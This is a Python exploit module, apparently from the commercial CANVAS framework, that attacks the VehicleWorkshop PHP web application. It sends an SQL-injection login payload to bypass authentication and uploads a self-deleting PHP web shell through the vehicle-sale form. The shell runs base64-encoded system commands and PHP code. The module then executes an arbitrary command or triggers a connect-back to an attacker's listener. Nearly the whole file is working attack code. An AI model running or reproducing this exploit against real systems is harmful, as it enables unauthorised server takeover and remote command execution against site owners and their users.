#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# http://www.immunityinc.com/CANVAS/ for more information

# python imports
import sys
import base64
import string
import re
import urllib

import logging

# path appends
if '.' not in sys.path:
    sys.path.append('.')

# CANVAS imports
from exploitutils import *
from ExploitTypes.php_multi import *
import canvasengine
from phplistener import get_php_stage1


NAME                            = "VehicleWorkshop Command Execution"
DESCRIPTION                     = "VehicleWorkshop Command Execution"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "VehicleWorkshop"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["CVE Name"]       = ""
DOCUMENTATION["CVE Url"]        = ""

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Linux", "Windows"] ]
PROPERTY['VERSION']             = [ "" ]

NOTES = """

We use two vulnerabilities in VehicleWorkshop to obtain command execution:

VehicleWorkshop - Authentication Bypass
https://www.exploit-db.com/exploits/42403/

VehicleWorkshop Unrestricted File Upload
https://www.exploit-db.com/exploits/42404/

"""

CHANGELOG = """
"""


class theexploit(object, php_multi):
    def __init__(self):
        php_multi.__init__(self)
        self.port = 80
        self.host = ""
        self.ssl = False
        self.basepath = "/"
        self.command = None
        self.basicauth_user = ""
        self.basicauth_password = ""
        self.user = ""
        self.password = ""
        self.hostname = None
        self.foundstrings = ["Spring 2015 - Online Vehicle Workshop"]
        self.testfile = "/"
        self.shellnum = random.randint(1, 1000)
        self.command = None

    def request1(self):
        logging.info("Getting cookies...")
        (data, code) = self.UA.POST("/login.php", "loginid=%27%20OR%201%20limit%201--%20-&password=&submit=Login", return_response_code=True)

        if code == 302:
            logging.info("Cookie: %s" % self.UA.cookies)
            self.setProgress(30)
            return 1
        else:
            logging.error("Login failed")
            self.setProgress(-1)
            self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port))
            return 0

    def request2(self):
        logging.info("Uploading shell%d.php" % self.shellnum)

        scode = "<?php error_reporting(0); ini_set(\"max_execution_time\",0); unlink(__FILE__); print \"startz\"; passthru(base64_decode($_REQUEST[SERVER_INFO])); eval(base64_decode($_REQUEST[SERVER_INFO2])); print \"endz\"; exit; ?>"
        files = (("file", "shell%d.php" % self.shellnum, scode), )
        data = {"vehname":"123", "model":"asd", "brand":"asd", "image":"", "estdprice":"111", "other":"q", "submit":"Sell vehicle"}

        self.UA.multipart("/sellvehicle.php", data, files)

        self.setProgress(60)
        return 1

    def request3(self):
        if self.command:
            logging.info("Running command: %s" % self.command)

            command = self.command
            command = b64encode(command)
            logging.debug("Base64_encoded Command: %s" % command)

            data = self.UA.GET("/upload/shell%d.php?SERVER_INFO=%s" % (self.shellnum, urllib.quote_plus(command)))

            if "startz" in data:
                result = data.split("startz")[1].split("endz")[0]
                logging.info("Command result: %s" % prettyprint(result))
                self.succeeded = 1
                self.setProgress(100)
                self.setInfo("%s attacking %s:%d (success)"%(self.name,self.host,self.port))
                return 1
            else:
                logging.error("Error while executing command")
                self.setProgress(-1)
                self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port))
                return 0
        else:
            logging.info("Running command")
            command = self.get_php_to_mosdef()
            logging.debug("Command: %s" % command)
            command = b64encode(command)
            logging.debug("Base64_encoded Command: %s" % command)

            (data, code) = self.UA.GET("/upload/shell%d.php?SERVER_INFO2=%s" % (self.shellnum, urllib.quote_plus(command)), return_response_code=True)
            logging.info("Waiting for PHP connectback")

            if code == 200:
                self.succeeded = 1
                self.setProgress(100)
                self.setInfo("%s attacking %s:%d (success)"%(self.name,self.host,self.port))
                return 1
            else:
                self.setProgress(-1)
                self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port))
                return 0


    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.104.128 -p 80 -l 10.10.10.227 -d 5555")
        logging.info("-t <target ip>")
        logging.info("-p <target port>                [optional]")
        logging.info("-O basepath: /path/to/app/      [optional]")
        logging.info("-O hostname: target vhost       [optional]")
        logging.info("-O command:commandtorun         [optional]")
        logging.info("-l call back ip if doing connect back")
        logging.info("-d listening port for call back")

    def getargs(self):
        temp = super(theexploit, self).getargs()
        self.basepaths = [self.basepath]
        return temp

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    standard_callback_commandline(app)
